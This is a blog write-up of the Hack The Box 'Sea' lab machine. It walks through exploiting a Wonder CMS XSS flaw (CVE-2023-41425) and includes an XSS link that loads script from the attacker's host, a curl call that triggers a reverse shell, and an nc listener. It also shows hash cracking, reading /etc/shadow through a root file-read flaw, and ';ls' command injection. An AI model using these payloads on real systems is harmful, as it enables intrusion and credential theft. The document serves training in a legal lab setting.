<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sea Writeup HTB - Astro boilerplate</title><meta name="description" content="Steps taken to compromise the &#34;Permx&#34; box from htb, the lab was straightforward and very beginner friendly."><meta name="author" content="Roqeeb"><link rel="alternate" type="application/rss+xml" href="/rss.xml"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="/_astro/index.CvLV1VIh.css" /></head> <body class="bg-slate-900 text-gray-100"> <div class="mx-auto max-w-screen-lg px-3 py-6"><div class="flex flex-col gap-y-3 sm:flex-row sm:items-center sm:justify-between"><a href="/"><div class="flex items-center bg-gradient-to-br from-sky-500 to-cyan-400 bg-clip-text text-xl font-bold text-transparent"><svg class="mr-1 h-10 w-10 stroke-cyan-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M0 0h24v24H0z" stroke="none"></path><rect x="3" y="12" width="6" height="8" rx="1"></rect><rect x="9" y="8" width="6" height="12" rx="1"></rect><rect x="15" y="4" width="6" height="16" rx="1"></rect><path d="M4 20h14"></path></svg>Roqeeb&#x27;s Blog</div></a><nav><ul class="flex gap-x-3 font-medium text-gray-200"><li class="hover:text-white"><a href="/posts/" target="_self">Blogs</a></li><li class="hover:text-white"><a href="/posts/" target="_self">Writeups</a></li><li class="hover:text-white"><a href="https://x.com/FireEyesOMG" target="_blank">Twitter</a></li><li class="hover:text-white"><a href="https://github.com/0xRoqeeb" target="_blank">Github</a></li></ul></nav></div></div>  <div class="mx-auto max-w-screen-lg px-3 py-6"><h1 class="text-center text-3xl font-bold">Sea Writeup HTB</h1><div class="mt-2 text-center text-sm text-gray-400">By <!-- -->Roqeeb<!-- --> on<!-- --> <!-- -->Mar 2, 2020</div><div class="mx-auto mt-5 "><div class="aspect-w-3 aspect-h-2"><img class="h-full w-full rounded-lg object-cover object-center" src="https://labs.hackthebox.com/storage/avatars/0011f6725aed869f8683589cb08c90d0.png" alt="Image post 5" loading="lazy"/></div><div class="prose prose-invert mt-8 prose-img:rounded-lg"> <h1 id="sea-htb-write-up">Sea HTB Write-Up</h1>
<p>by Roqeeb</p>
<p><strong>Difficulty:</strong> Easy<br>
<strong>IP Address:</strong> 10.10.11.28</p>
<p>This writeup might be a bit wordy here and there , and a bit on the nose on a particular aspect sometimes, that because i was writing it while solving the box
enjoy</p>
<h2 id="enumeration">Enumeration</h2>
<p>We’ll begin by scanning the target IP address, <code>10.10.11.28</code>, to identify open ports and services running on the Sea box.</p>
<h2 id="enumeration-1">Enumeration</h2>
<p>As usual, I’ll start by using <code>rustscan</code> in combination with <code>nmap</code> to quickly identify open ports and gather detailed service information.</p>
<h3 id="rustscan-command">Rustscan Command</h3>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">rustscan</span><span style="color:#AE81FF"> -a</span><span style="color:#AE81FF"> -t</span><span style="color:#AE81FF"> 2000</span><span style="color:#AE81FF"> 10.10</span><span style="color:#E6DB74">.11.20</span><span style="color:#AE81FF"> --</span><span style="color:#AE81FF"> -sC</span><span style="color:#AE81FF"> -sV</span><span style="color:#AE81FF"> -oN</span><span style="color:#E6DB74"> nmap</span><span style="color:#AE81FF"> -Pn</span></span></code></pre>
<h3 id="initial-results">Initial Results</h3>
<p>Right off the bat, <code>rustscan</code> picked up <strong>Port 22 (SSH)</strong> and <strong>Port 80 (HTTP)</strong>. While the scan was still doing its thing, I decided to jump into my browser and punch in the IP address <code>10.10.11.28</code>.</p>
<h3 id="web-exploration">Web Exploration</h3>
<p>Boom! I’m greeted by a pretty slick biking site. Unlike other HTB boxes, I didn’t even have to mess with my <code>/etc/hosts</code> file to add <code>sea.htb</code>—it just worked straight up.</p>
<h3 id="digging-deeper">Digging Deeper</h3>
<p>I fired up Burp Suite because, well, why not? By the time I got that going, <code>nmap</code> had finished its scan, and it didn’t find any extra ports.</p>
<h3 id="nmap-results">Nmap Results</h3>
<p>Here’s what <code>nmap</code> showed:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">PORT</span><span style="color:#E6DB74">   STATE</span><span style="color:#E6DB74"> SERVICE</span><span style="color:#E6DB74"> REASON</span><span style="color:#E6DB74">  VERSION</span></span>
<span class="line"><span style="color:#A6E22E">22/tcp</span><span style="color:#E6DB74"> open</span><span style="color:#E6DB74">  ssh</span><span style="color:#E6DB74">     syn-ack</span><span style="color:#E6DB74"> OpenSSH</span><span style="color:#AE81FF"> 8.9</span><span style="color:#E6DB74">p1</span><span style="color:#E6DB74"> Ubuntu</span><span style="color:#AE81FF"> 3</span><span style="color:#E6DB74">ubuntu0.7</span><span style="color:#F8F8F2"> (Ubuntu </span><span style="color:#E6DB74">Linux</span><span style="color:#F8F8F2">; </span><span style="color:#A6E22E">protocol</span><span style="color:#AE81FF"> 2.0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E"> ssh-hostkey:</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">   256</span><span style="color:#AE81FF"> 0</span><span style="color:#E6DB74">d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64</span><span style="color:#F8F8F2"> (ECDSA)</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E"> ecdsa-sha2-nistp256</span><span style="color:#E6DB74"> AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">   256</span><span style="color:#AE81FF"> 0</span><span style="color:#E6DB74">f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0</span><span style="color:#F8F8F2"> (ED25519)</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_ssh-ed25519</span><span style="color:#E6DB74"> AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx</span></span>
<span class="line"><span style="color:#A6E22E">80/tcp</span><span style="color:#E6DB74"> open</span><span style="color:#E6DB74">  http</span><span style="color:#E6DB74">    syn-ack</span><span style="color:#E6DB74"> nginx</span><span style="color:#AE81FF"> 1.18</span><span style="color:#E6DB74">.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E"> http-methods:</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_</span><span style="color:#E6DB74">  Supported</span><span style="color:#E6DB74"> Methods:</span><span style="color:#E6DB74"> OPTIONS</span><span style="color:#E6DB74"> HEAD</span><span style="color:#E6DB74"> GET</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_http-title:</span><span style="color:#E6DB74"> Editorial</span><span style="color:#E6DB74"> Tiempo</span><span style="color:#E6DB74"> Arriba</span></span>
<span class="line"><span style="color:#F92672">|</span><span style="color:#A6E22E">_http-server-header:</span><span style="color:#E6DB74"> nginx/1.18.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"><span style="color:#A6E22E">Service</span><span style="color:#E6DB74"> Info:</span><span style="color:#E6DB74"> OS:</span><span style="color:#E6DB74"> Linux</span><span style="color:#F8F8F2">; </span><span style="color:#A6E22E">CPE:</span><span style="color:#E6DB74"> cpe:/o:linux:linux_kernel</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6E22E">So,</span><span style="color:#E6DB74"> just</span><span style="color:#FD971F"> **</span><span style="color:#E6DB74">Port</span><span style="color:#AE81FF"> 22</span><span style="color:#F8F8F2"> (SSH)</span><span style="color:#F92672">**</span><span style="color:#F8F8F2"> and </span><span style="color:#F92672">**</span><span style="color:#F8F8F2">Port 80 (</span><span style="color:#A6E22E">HTTP</span><span style="color:#F8F8F2">)</span><span style="color:#F92672">**</span><span style="color:#F8F8F2"> running </span><span style="color:#E6DB74">`</span><span style="color:#A6E22E">nginx</span><span style="color:#E6DB74">`</span><span style="color:#66D9EF">.</span><span style="color:#E6DB74"> The</span><span style="color:#E6DB74"> site</span><span style="color:#E6DB74"> title</span><span style="color:#E6DB74"> showed</span><span style="color:#E6DB74"> as</span><span style="color:#FD971F"> *</span><span style="color:#E6DB74">Editorial</span><span style="color:#E6DB74"> Tiempo</span><span style="color:#E6DB74"> Arriba</span><span style="color:#FD971F">*</span><span style="color:#E6DB74">,</span><span style="color:#E6DB74"> which</span><span style="color:#E6DB74"> matches</span><span style="color:#E6DB74"> the</span><span style="color:#E6DB74"> biking</span><span style="color:#E6DB74"> theme</span><span style="color:#E6DB74"> I</span><span style="color:#E6DB74"> saw</span><span style="color:#E6DB74"> earlier.</span></span>
<span class="line"></span></code></pre>
<p>So, just <strong>Port 22 (SSH)</strong> and <strong>Port 80 (HTTP)</strong> running <code>nginx</code>. The site title showed as <em>Editorial Tiempo Arriba</em>, which matches the biking theme I saw earlier.</p>
<p>i also started an active spider on burpsuite just in case</p>
<h3 id="exploring-the-website">Exploring the Website</h3>
<p>While browsing around the site, I found a “How to Participate” page. This page had a link that led me to <code>sea.htb/contact.php</code>.</p>
<h3 id="hosts-file-update">Hosts File Update</h3>
<p>So, it turns out I did need to add <code>sea.htb</code> to my <code>/etc/hosts</code> file after all.</p>
<h3 id="visiting-contactphp">Visiting <code>contact.php</code></h3>
<p>When I hit up <code>sea.htb/contact.php</code>, I was greeted by a contact form. I’m not really a fan of testing forms unless I’m out of options, so I decided to switch things up.</p>
<h3 id="directory-scanning">Directory Scanning</h3>
<p>I fired up a directory scan using <code>dirsearch</code>—trying something new this time.</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">dirsearch</span><span style="color:#AE81FF"> -u</span><span style="color:#E6DB74"> http://sea.htb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6E22E">  _</span><span style="color:#F92672">|</span><span style="color:#66D9EF">.</span><span style="color:#E6DB74"> _</span><span style="color:#E6DB74"> _</span><span style="color:#E6DB74">  _</span><span style="color:#E6DB74">  _</span><span style="color:#E6DB74">  _</span><span style="color:#E6DB74"> _</span><span style="color:#F92672">|</span><span style="color:#A6E22E">_</span><span style="color:#E6DB74">    v0.4.3</span><span style="color:#F8F8F2">                                                                                                                                      </span></span>
<span class="line"><span style="color:#F8F8F2"> (</span><span style="color:#A6E22E">_</span><span style="color:#F92672">|||</span><span style="color:#A6E22E"> _</span><span style="color:#F8F8F2">) (</span><span style="color:#A6E22E">/_(_</span><span style="color:#F92672">||</span><span style="color:#F8F8F2"> (</span><span style="color:#A6E22E">_</span><span style="color:#F92672">|</span><span style="color:#F8F8F2"> )                                                                                                                                               </span></span>
<span class="line"><span style="color:#F8F8F2">                                                                                                                                                                      </span></span>
<span class="line"><span style="color:#A6E22E">Extensions:</span><span style="color:#E6DB74"> php,</span><span style="color:#E6DB74"> aspx,</span><span style="color:#E6DB74"> jsp,</span><span style="color:#E6DB74"> html,</span><span style="color:#E6DB74"> js</span><span style="color:#F92672"> |</span><span style="color:#A6E22E"> HTTP</span><span style="color:#E6DB74"> method:</span><span style="color:#E6DB74"> GET</span><span style="color:#F92672"> |</span><span style="color:#A6E22E"> Threads:</span><span style="color:#AE81FF"> 25</span><span style="color:#F92672"> |</span><span style="color:#A6E22E"> Wordlist</span><span style="color:#E6DB74"> size:</span><span style="color:#AE81FF"> 11460</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6E22E">Output</span><span style="color:#E6DB74"> File:</span><span style="color:#E6DB74"> /home/mofe/reports/http_sea.htb/__24-08-13_09-41-38.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6E22E">Target:</span><span style="color:#E6DB74"> http://sea.htb/</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:38] Starting:                                                                                                                                                  </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:43] 403 -  199B  - /%3f/                                             </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.ht_wsr.txt                                      </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess.orig                                   </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess.sample                                 </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess.bak1                                   </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess.save                                   </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess_extra                                  </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess_sc</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccessBAK</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccessOLD2</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.html</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.httr-oauth                                      </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htpasswds</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htpasswd_test</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccess_orig                                   </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htaccessOLD                                     </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:48] 403 -  199B  - /.htm</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:50] 403 -  199B  - /.php                                             </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:41:55] 200 -    1KB - /404                                              </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:01] 403 -  199B  - /admin%20/                                        </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:25] 200 -  939B  - /contact.php                                      </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:28] 301 -  228B  - /data  -</span><span style="color:#F92672">></span><span style="color:#F8F8F2">  http://sea.htb/data/                   </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:28] 403 -  199B  - /data/                                            </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:28] 403 -  199B  - /data/files/                                      </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:47] 403 -  199B  - /login.wdm%20                                     </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:51] 301 -  232B  - /messages  -</span><span style="color:#F92672">></span><span style="color:#F8F8F2">  http://sea.htb/messages/           </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:56] 403 -  199B  - /New%20Folder                                     </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:42:56] 403 -  199B  - /New%20folder%20(</span><span style="color:#A6E22E">2</span><span style="color:#F8F8F2">)                               </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:00] 403 -  199B  - /phpliteadmin%202.php                             </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:04] 301 -  231B  - /plugins  -</span><span style="color:#F92672">></span><span style="color:#F8F8F2">  http://sea.htb/plugins/             </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:04] 403 -  199B  - /plugins/</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:07] 403 -  199B  - /Read%20Me.txt                                    </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:11] 403 -  199B  - /server-status                                    </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:11] 403 -  199B  - /server-status/</span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:22] 301 -  230B  - /themes  -</span><span style="color:#F92672">></span><span style="color:#F8F8F2">  http://sea.htb/themes/               </span></span>
<span class="line"><span style="color:#F8F8F2">[</span><span style="color:#AE81FF">09</span><span style="color:#F8F8F2">:43:22] 403 -  199B  - /themes/</span></span>
<span class="line"><span style="color:#F8F8F2">                                                                             </span></span>
<span class="line"><span style="color:#A6E22E">Task</span><span style="color:#E6DB74"> Completed</span><span style="color:#F8F8F2">  </span></span></code></pre>
<h3 id="dirsearch-results">Dirsearch Results</h3>
<p>The directory scan with <code>dirsearch</code> wrapped up, and here’s what I found:</p>
<ul>
<li><strong>403 Forbidden</strong> on several <code>.htaccess</code> and other sensitive files (e.g., <code>/admin%20/</code>, <code>/data/</code>, <code>/plugins/</code>, etc.).</li>
<li><strong>200 OK</strong> on <code>/contact.php</code> (which I already knew about) and <code>/404</code>.</li>
<li><strong>301 Redirects</strong> for <code>/data</code>, <code>/messages</code>, <code>/plugins</code>, and <code>/themes</code>, but they all returned 403s.</li>
</ul>
<p>Not too much to go on yet, but these 403s might hide something interesting.</p>
<h3 id="false-positives-from-home">False Positives from <code>/home</code></h3>
<p>While poking around, I realized that the site returns the homepage for any URL ending with <code>/home</code>. This made recursive directory busting a bit messy, as it led to a bunch of false positives. For example, even something like:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>http://sea.htb/no-fricking-way/home</span></span></code></pre>
<p>Would just bring up the homepage again, which isn’t helpful at all.</p>
<h3 id="sorting-through-dirbuster-results">Sorting Through DirBuster Results</h3>
<p>After sifting through the results from OWASP DirBuster, I sorted them by HTTP status code 200 to filter out the relevant paths. This revealed a few interesting ones:</p>
<ul>
<li><strong>/Version</strong>: This might provide some details about the site’s version.</li>
<li><strong>/README.md</strong>: Often a README file can contain useful information or hints.</li>
</ul>
<p>I’ll take a closer look at these paths to see what useful information they might hold.</p>
<p>From the <code>/themes/bike/README.md</code> file, I discovered that the site is running <strong>Wonder CMS</strong> with a <strong>Bike theme</strong>.</p>
<h3 id="version-information">Version Information</h3>
<p>I checked out the <code>/themes/bike/version</code> page and found a single line of text revealing the version number: 3.2.0</p>
<h3 id="vulnerability-identification">Vulnerability Identification</h3>
<p>For Wonder CMS version 3.2.0, I found a relevant vulnerability:</p>
<ul>
<li><strong>CVE-2023-41425</strong>: This is a Cross-Site Scripting (XSS) vulnerability affecting Wonder CMS versions from 3.2.0 to 3.4.2. It allows a remote attacker to execute arbitrary code by uploading a crafted script to the <code>installModule</code> component.</li>
</ul>
<h3 id="exploiting-the-web-shell">Exploiting the Web Shell</h3>
<p>After running the exploit, I was prompted with the usage instructions:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#A6E22E">python</span><span style="color:#E6DB74"> exploit.py</span><span style="color:#F8F8F2">                                  </span></span>
<span class="line"><span style="color:#A6E22E">usage:</span><span style="color:#E6DB74"> python3</span><span style="color:#E6DB74"> exploit.py</span><span style="color:#E6DB74"> loginURL</span><span style="color:#E6DB74"> IP_Address</span><span style="color:#E6DB74"> Port</span></span>
<span class="line"><span style="color:#A6E22E">example:</span><span style="color:#E6DB74"> python3</span><span style="color:#E6DB74"> exploit.py</span><span style="color:#E6DB74"> http://localhost/wondercms/loginURL</span><span style="color:#AE81FF"> 192.168</span><span style="color:#E6DB74">.29.165</span><span style="color:#AE81FF"> 5252</span></span></code></pre>
<p>I set up my listener and tried the exploit again with the necessary information. The exploit created a web shell and provided the following details:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>python exploit.py http://sea.htb/loginURL 10.10.14.18 4444 </span></span>
<span class="line"><span>[+] xss.js is created</span></span>
<span class="line"><span>[+] execute the below command in another terminal</span></span>
<span class="line"><span></span></span>
<span class="line"><span>----------------------------</span></span>
<span class="line"><span>nc -lvp 4444</span></span>
<span class="line"><span>----------------------------</span></span>
<span class="line"><span></span></span>
<span class="line"><span>send the below link to admin:</span></span>
<span class="line"><span></span></span>
<span class="line"><span>----------------------------</span></span>
<span class="line"><span>http://sea.htb/index.php?page=loginURL?">&#x3C;/form>&#x3C;script+src="http://10.10.14.18:8000/xss.js">&#x3C;/script>&#x3C;form+action="</span></span>
<span class="line"><span>----------------------------</span></span>
<span class="line"><span></span></span>
<span class="line"><span>starting HTTP server to allow the access to xss.js</span></span>
<span class="line"><span>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></span></code></pre>
<p>Since the method in the exploit was complex, I opted to use curl to access the web shell directly. The web shell location was stated in the code:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.18&#x26;lport=4444"</span></span></code></pre>
<p>the commond worked and i got a reverse shell</p>
<p><img src="https://github.com/user-attachments/assets/b9a8ab01-6126-484a-9e74-b4d3addba8ad" alt="2024-08-13_13-15"></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>After obtaining a shell as <code>www-data</code>, I upgraded my shell for better interaction. My first step was to explore the web directories for sensitive information that could assist with privilege escalation.</p>
<p>From the shell at <code>www-data@sea:/var/www/sea$</code>, I navigated to the <code>/data</code> directory and discovered a <code>database.js</code> file. This file contained a hash that could be useful.</p>
<p>Here’s a screenshot of the hash found in <code>database.js</code>:</p>
<p><img src="https://github.com/user-attachments/assets/5e217df4-766a-4904-ba6c-22d4ced08e4c" alt="2024-08-13_13-29"></p>
<h2 id="bcrypt-hash-cracking-and-ssh-access">Bcrypt Hash Cracking and SSH Access</h2>
<h3 id="hash-cracking">Hash Cracking</h3>
<p>I was trying to crack the following bcrypt hash using <code>john</code>:</p>
<p>However, john was giving me errors.I noticed that the hash had backslashes escaping the forward slashes, which might have been causing the issue, so I corrected the hash by removing the backslashes. The correct bcrypt hash should have forward slashes (/) without being escaped by backslashes (). Here’s a comparison:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>    Original Hash:</span></span>
<span class="line"><span>    $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    Corrected Hash:</span></span>
<span class="line"><span>    $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q</span></span></code></pre>
<p>and john sucessfully cracked the hash</p>
<p><img src="https://github.com/user-attachments/assets/2fac0a66-c5a9-4211-a995-71624529fe5f" alt="pass"></p>
<p>Gaining Access via SSH</p>
<p>I discovered two users on the host: amay and geo. I tried the cracked password for both users via SSH, and it worked for amay.
Post-Exploration</p>
<p>Once I gained shell access as the amay user, I ran linpeas to enumerate potential privilege escalation paths.
While checking open ports on the machine, I noticed that port 8080 was open. Suspecting it might be a web service, I tried to access it using curl:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>amay@sea:/tmp$ curl http://127.0.0.1:8080/</span></span>
<span class="line"><span>Unauthorized access</span></span></code></pre>
<p>To investigate further, I decided to port forward the service to my local machine using SSH:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>ssh -L 8080:127.0.0.1:8080 amay@sea.htb</span></span>
<span class="line"><span>#this command goes on your local machine</span></span></code></pre>
<p>After setting up the port forwarding, I accessed <a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a> on my web browser, which presented a login prompt.</p>
<p><img src="https://github.com/user-attachments/assets/cc10eb7d-2de0-44d4-bc38-aff882f42f83" alt="port8080"></p>
<p>Nmap Scan and Login Attempt</p>
<p>I ran an Nmap scan on the forwarded port to gather more information:</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>PORT     STATE  SERVICE    REASON       VERSION</span></span>
<span class="line"><span>8080/tcp closed http-proxy conn-refused</span></span></code></pre>
<p>i tried logging in using the credentials amay:mychemicalromance, and it worked. no cause for alarm</p>
<h3 id="discovering-another-web-service">Discovering Another Web Service</h3>
<p><img src="https://github.com/user-attachments/assets/3b51e29a-e98a-404d-a79b-f331e3903d5d" alt="home"></p>
<p>I discovered another web service that appeared to be a system monitor for internal services. It displayed disk usage and had some system management functions. I was pretty exhausted at this point and wasn’t eager to dive into testing yet another web service, so I started clicking buttons hoping for something useful.</p>
<p>One of the options was “Analyse Files” on <code>access.log</code>, but it returned a huge amount of logs ,yeah i ain reading allat. I opened Burp Suite to intercept the requests, but realized my proxy wasn’t working. It took me a moment to remember that I was port forwarding using Burp’s default proxy port, so I had to create a new proxy for port 8081 and update Burp Suite accordingly.</p>
<p>Once I intercepted the request, I noticed something interesting:</p>
<p><img src="https://github.com/user-attachments/assets/57f394e7-b3c0-4eef-be88-70678c722c4e" alt="log"></p>
<p>It seemed like the web service allowed me to specify the exact file to read on the system. I tested this with <code>/var/log/auth.log</code> and it worked—indicating that this web service likely had root privileges.</p>
<p>With that knowledge, I decided to take baby steps. I started by reading easier files, and sure enough, I was able to read them without any issues. I then checked for the <code>shadow</code> file and was able to access the password hashes.</p>
<p>Finally, I attempted to read <code>root.txt</code> but was met with an unexpected message:</p>
<p><img src="https://github.com/user-attachments/assets/e98eba5e-2a6e-41d1-bdb0-bb65848e982f" alt="suspic"></p>
<p>It seemed that the web service required “suspicious traffic” before it shows the contents of the file. hmmm
i tried inserting null byte at the end of the file name maybe it’ll trigger something</p>
<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>log_file=%2froot%2froot.txt%00&#x26;analyze_log=</span></span></code></pre>
<p>i was about to open payload all the things then it occured to me to try a simple command injection, i was not not trying to bypass i was trying to br flagged,so i appended ‘;ls’</p>
<p><img src="https://github.com/user-attachments/assets/6ef6421d-0594-453b-b960-e090211c631b" alt="nice2"></p>
<p>and surely enough it got flagged and we were able to read the root flag</p> </div></div></div> <div class="mx-auto max-w-screen-lg px-3 py-6"><div class="flex flex-col items-center justify-between gap-6 sm:flex-row"><div class="sm:w-7/12"><div class="text-3xl font-bold">Subscribe to my <span class="bg-gradient-to-br from-sky-500 to-cyan-400 bg-clip-text text-transparent">Newsletters</span></div><p class="mt-3 text-gray-300">Join my newsletter to stay updated on the latest in cybersecurity, tips, and write-ups. Get exclusive insights straight to your inbox!.</p></div><div class="w-full sm:w-5/12"><form class="flex rounded-full bg-slate-800 px-4 py-2 focus-within:ring-2 focus-within:ring-cyan-600 hover:ring-2 hover:ring-cyan-600"><input class="w-full appearance-none bg-slate-800 focus:outline-none"/><button class="ml-2 shrink-0 rounded-full bg-gradient-to-br from-sky-500 to-cyan-400 px-3 py-1 text-sm font-medium hover:from-sky-700 hover:to-cyan-600 focus:outline-none focus:ring-2 focus:ring-cyan-600/50" type="submit">Subscribe</button></form></div></div></div>  <!-- <Footer /> --> </body></html>